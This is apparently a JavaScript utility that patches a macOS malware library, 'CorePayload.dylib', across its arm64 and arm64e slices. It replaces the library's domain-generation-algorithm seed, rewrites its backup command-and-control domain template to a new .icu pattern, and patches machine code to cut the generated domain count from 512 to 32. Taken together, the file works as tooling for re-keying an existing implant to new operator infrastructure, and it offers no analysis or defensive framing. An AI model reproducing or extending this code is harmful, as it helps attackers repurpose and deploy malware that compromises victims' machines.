/**
 * CorePayload Patcher
 *
 * Patch CorePayload.dylib (universal binary: arm64 + arm64e):
 * - DGA seed (3 处 per arch)
 * - Backup 域名
 * - Domain count (512→32)
 */
import { parseFatHeader, findAllOccurrences } from './fat-binary.js';
const ORIGINAL_SEED = '761847cfb1ad3de68e11239dcc26c30b';
const BACKUP_FMT_OLD = 'https://backup%u.icu';
const BACKUP_FMT_NEW = 'https://ibk%u.icu';
const DEFAULT_DOMAIN_COUNT = 32;
const DOMAIN_COUNT_OFFSETS = {
    arm64: 0xACB48,
    arm64e: 0xB8DF0,
};
export function patchCorePayload(input, opts) {
    if (opts.seed.length !== 32) {
        throw new Error(`Seed must be exactly 32 characters (got ${opts.seed.length})`);
    }
    const patched = Buffer.from(input);
    const arches = parseFatHeader(patched);
    if (!arches) {
        // Single-architecture
        patchSlice(patched, 0, patched.length, opts.seed, 'arm64');
    }
    else {
        const archNames = ['arm64', 'arm64e'];
        for (let i = 0; i < arches.length; i++) {
            patchSlice(patched, arches[i].offset, arches[i].size, opts.seed, archNames[i] || `arch${i}`);
        }
    }
    return patched;
}
function patchSlice(patched, sliceOffset, sliceSize, seed, archName) {
    // 1. 搜索替换所有 seed
    const seedPositions = findAllOccurrences(patched.subarray(sliceOffset, sliceOffset + sliceSize), ORIGINAL_SEED).map(p => p + sliceOffset);
    if (seedPositions.length === 0) {
        throw new Error(`No DGA seed found in ${archName} slice`);
    }
    for (const pos of seedPositions) {
        for (let i = 0; i < 32; i++) {
            patched[pos + i] = seed.charCodeAt(i);
        }
    }
    // 2. Patch backup 域名
    const backupPositions = findAllOccurrences(patched.subarray(sliceOffset, sliceOffset + sliceSize), BACKUP_FMT_OLD).map(p => p + sliceOffset);
    for (const pos of backupPositions) {
        for (let i = 0; i < 21; i++)
            patched[pos + i] = 0;
        Buffer.from(BACKUP_FMT_NEW, 'ascii').copy(patched, pos);
    }
    // 3. Patch domain count
    const countOffset = DOMAIN_COUNT_OFFSETS[archName];
    if (countOffset) {
        const fileOffset = sliceOffset + countOffset;
        const origInstr = patched.readUInt32LE(fileOffset);
        if (origInstr === 0x52804001) { // mov w1, #0x200
            const movzInstr = ((0b01010010100 << 21) | (DEFAULT_DOMAIN_COUNT << 5) | 1) >>> 0;
            patched.writeUInt32LE(movzInstr, fileOffset);
        }
    }
}
//# sourceMappingURL=corepayload.js.map